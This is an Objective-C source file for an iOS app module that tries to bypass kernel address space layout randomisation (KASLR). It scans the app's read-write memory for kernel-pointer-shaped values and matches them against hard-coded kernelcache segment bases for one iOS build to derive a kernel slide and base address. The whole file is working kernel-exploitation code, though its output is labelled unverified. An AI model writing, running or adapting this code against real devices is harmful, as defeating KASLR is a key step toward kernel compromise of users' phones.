#import "KPKASLRBypassModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import "KPVMScanPolicy.h"
#import <mach/mach.h>

@interface KPKASLRBypassModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPKASLRBypassModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"kaslr.bypass";
        _title = @"KASLR bypass (RW region scan)";
        _subtitle = @"scan user-space RW regions for kernel pointers -> slide";
        _icon = @"lock.open";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-kaslr-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[kaslr] %@", line];
}

// Address-shaped integers are candidates only; no userspace value alone proves a kernel pointer.
static BOOL isKernelPtr(uint64_t v) {
    return KPIsKernelPointerCandidate(v);
}

// Known static segment bases for iOS 27.0.1 iPhone16,1 (from kernelcache Mach-O)
static const uint64_t kStaticBases[] = {
    0xfffffff007004000ULL,  // __TEXT
    0xfffffff00700c000ULL,  // __PRELINK_TEXT
    0xfffffff007ce0000ULL,  // __DATA_CONST
    0xfffffff0082b0000ULL,  // __DATA_SPTM
    0xfffffff0082fc000ULL,  // __TEXT_EXEC
    0xfffffff00b02c000ULL,  // __TEXT_BOOT_EXEC
    0xfffffff00b034000ULL,  // __PRELINK_INFO
    0xfffffff00b284000ULL,  // __DATA
    0xfffffff00b4e8000ULL,  // __LINKEDIT
};
static const int kStaticCount = sizeof(kStaticBases) / sizeof(kStaticBases[0]);

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · KASLR bypass (RW region scan) ===\n"];
    [report appendString:@"Technique: scan user-space RW regions for kernel pointers.\n"];
    [report appendString:@"Ref: asuka4scape KASLR bypass.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // --- Phase 1: enumerate and scan RW regions ---
    [report appendString:@"\n--- Phase 1: RW region scan ---\n"];

    kern_return_t kr;
    vm_address_t addr = 0;
    vm_size_t size = 0;
    uint32_t depth = 0;
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t count;

    int regionCount = 0;
    int rwRegionCount = 0;
    int scannedRWRegionCount = 0;
    int skippedRegionCount = 0;
    int oversizedRegionCount = 0;
    int filteredConstantCount = 0;
    int totalKptrs = 0;

    // Slide candidates: map<slide, count>
    #define MAX_CANDIDATES 256
    uint64_t slideCandidates[MAX_CANDIDATES] = {0};
    int slideCounts[MAX_CANDIDATES] = {0};
    int candidateCount = 0;

    // Collected address-shaped values (first 32)
    #define MAX_KPTRS 32
    uint64_t foundKptrs[MAX_KPTRS] = {0};
    uint64_t foundKptrAddrs[MAX_KPTRS] = {0};
    int foundCount = 0;

    while (1) {
        addr = (addr == 0) ? 0 : addr + size;
        count = VM_REGION_SUBMAP_INFO_COUNT_64;
        kr = vm_region_recurse_64(mach_task_self(), &addr, &size, &depth,
                                   (vm_region_recurse_info_t)&info, &count);
        if (kr != KERN_SUCCESS || size == 0) break;

        regionCount++;
        if (info.is_submap) { depth++; continue; }
        if ((info.protection & (VM_PROT_READ | VM_PROT_WRITE)) != (VM_PROT_READ | VM_PROT_WRITE)) continue;
        rwRegionCount++;

        if (size > 16 * 1024 * 1024) {
            oversizedRegionCount++;
            continue;
        }
        if (KPVMShouldSkipRegion(&info, addr, size, &foundCount, NULL, NULL, 0)) {
            skippedRegionCount++;
            continue;
        }
        scannedRWRegionCount++;

        volatile uint64_t *p = (volatile uint64_t *)addr;
        size_t words = size / 8;
        for (size_t i = 0; i < words; i++) {
            uint64_t v = p[i];
            if (!isKernelPtr(v)) continue;
            if (KPIsKnownDiagnosticConstant(v)) {
                filteredConstantCount++;
                continue;
            }

            totalKptrs++;
            // Per ollie: dedup by value — repeated struct headers at a fixed
            // stride otherwise drown the first log slots with one constant field.
            BOOL seen = NO;
            for (int s = 0; s < foundCount; s++) {
                if (foundKptrs[s] == v) { seen = YES; break; }
            }
            if (!seen && foundCount < MAX_KPTRS) {
                foundKptrs[foundCount] = v;
                foundKptrAddrs[foundCount] = addr + i * 8;
                foundCount++;
            }

            uint64_t untagged = 0;
            if (!KPIsPlausibleKernelText(v, &untagged)) continue;

            for (int b = 0; b < kStaticCount; b++) {
                if (untagged > kStaticBases[b]) {
                    uint64_t slide = untagged - kStaticBases[b];
                    if ((slide & 0x3FFF) == 0 && slide < (1024ULL << 20)) {
                        static const uint64_t kStaticSizes[] = {
                            0x8000, 0xcd4000, 0x5d0000, 0x4c000,
                            0x2d30000, 0x8000, 0x250000, 0x264000, 0xc0000
                        };
                        uint64_t segEnd = kStaticBases[b] + kStaticSizes[b];
                        uint64_t runtimeSegEnd = segEnd + slide;
                        if (untagged < runtimeSegEnd) {
                            BOOL found = NO;
                            for (int c = 0; c < candidateCount; c++) {
                                if (slideCandidates[c] == slide) {
                                    slideCounts[c]++;
                                    found = YES;
                                    break;
                                }
                            }
                            if (!found && candidateCount < MAX_CANDIDATES) {
                                slideCandidates[candidateCount] = slide;
                                slideCounts[candidateCount] = 1;
                                candidateCount++;
                            }
                        }
                    }
                }
            }
        }
    }

    [report appendFormat:@"regions enumerated: %d (RW: %d, scanned: %d)\n",
     regionCount, rwRegionCount, scannedRWRegionCount];
    [report appendFormat:@"regions filtered: %d (oversized: %d)\n", skippedRegionCount, oversizedRegionCount];
    [report appendFormat:@"address-shaped candidates: %d (distinct recorded: %d, known constants filtered: %d)\n",
     totalKptrs, foundCount, filteredConstantCount];

    // --- Phase 2: report address-shaped candidates ---
    static const char *kClassNames[] = {
        "REJECT_PACKED_INT32", "REJECT_BAD_TBI", "REJECT_UNALIGNED",
        "ZONE_HEAP", "KERNEL_TEXT_DATA"
    };
    [report appendString:@"\n--- Phase 2: address-shaped candidates (unverified) ---\n"];
    for (int i = 0; i < foundCount && i < 16; i++) {
        kptr_class_t cls = KPClassifyKPtr(foundKptrs[i]);
        [report appendFormat:@"  [%d] @ user=0x%llx -> value=0x%llx  %s\n",
         i, foundKptrAddrs[i], foundKptrs[i], kClassNames[cls]];
    }

    // --- Phase 3: slide candidates ---
    [report appendString:@"\n--- Phase 3: alignment-derived slide candidates (unverified) ---\n"];
    if (candidateCount == 0) {
        [report appendString:@"No alignment-derived slide candidates found.\n"];
        [report appendString:@"This does not prove that kernel pointers are absent.\n"];
    } else {
        for (int i = 0; i < candidateCount - 1; i++) {
            for (int j = 0; j < candidateCount - i - 1; j++) {
                if (slideCounts[j] < slideCounts[j + 1]) {
                    uint64_t ts = slideCandidates[j];
                    int tc = slideCounts[j];
                    slideCandidates[j] = slideCandidates[j + 1];
                    slideCounts[j] = slideCounts[j + 1];
                    slideCandidates[j + 1] = ts;
                    slideCounts[j + 1] = tc;
                }
            }
        }

        for (int i = 0; i < candidateCount && i < 10; i++) {
            [report appendFormat:@"  slide_candidate=0x%llx  hits=%d%s\n",
             slideCandidates[i], slideCounts[i],
             (i == 0) ? "  <-- MOST FREQUENT" : ""];
        }

        uint64_t bestSlide = slideCandidates[0];
        [report appendFormat:@"\nBest unverified slide candidate: 0x%llx\n", bestSlide];
        [report appendFormat:@"Derived __TEXT base candidate: 0x%llx\n",
         0xfffffff007004000ULL + bestSlide];
    }

    // --- Phase 4: kernel-heap-shaped values ---
    [report appendString:@"\n--- Phase 4: kernel-heap-shaped values ---\n"];
    int heapShapedCount = 0;
    for (int i = 0; i < foundCount; i++) {
        uint64_t v = foundKptrs[i];
        // Per ollie: only real zone-map shapes count; packed int32 pairs from
        // codec quant/motion tables must not inflate the heap tally.
        if (KPClassifyKPtr(v) != KPTR_CANDIDATE_ZONE_HEAP) continue;
        uint64_t heapVA = 0;
        if (KPIsPlausibleKernelHeap(v, &heapVA)) {
            heapShapedCount++;
            if (heapShapedCount <= 5) {
                [report appendFormat:@"  heap-shaped value: 0x%llx -> va=0x%llx (from user=0x%llx)\n",
                 v, heapVA, foundKptrAddrs[i]];
            }
        }
    }
    [report appendFormat:@"heap-shaped candidates: %d (not task/proc identifications)\n", heapShapedCount];

    // --- Verdict ---
    [report appendString:@"\n"];
    if (totalKptrs > 0 && candidateCount > 0) {
        [report appendString:@"VERDICT: ADDRESS_AND_SLIDE_CANDIDATES_UNVERIFIED\n"];
        [report appendString:@"Filtering removed local buffers and known constants; external corroboration is still required.\n"];
    } else if (totalKptrs > 0) {
        [report appendString:@"VERDICT: ADDRESS_CANDIDATES_NO_SLIDE\n"];
        [report appendString:@"Address-shaped values remain, but no aligned slide candidate was derived.\n"];
    } else {
        [report appendString:@"VERDICT: NO_ADDRESS_CANDIDATES_AFTER_FILTER\n"];
        [report appendString:@"No address-shaped values remained in the selected regions.\n"];
    }

    return report;
}

@end
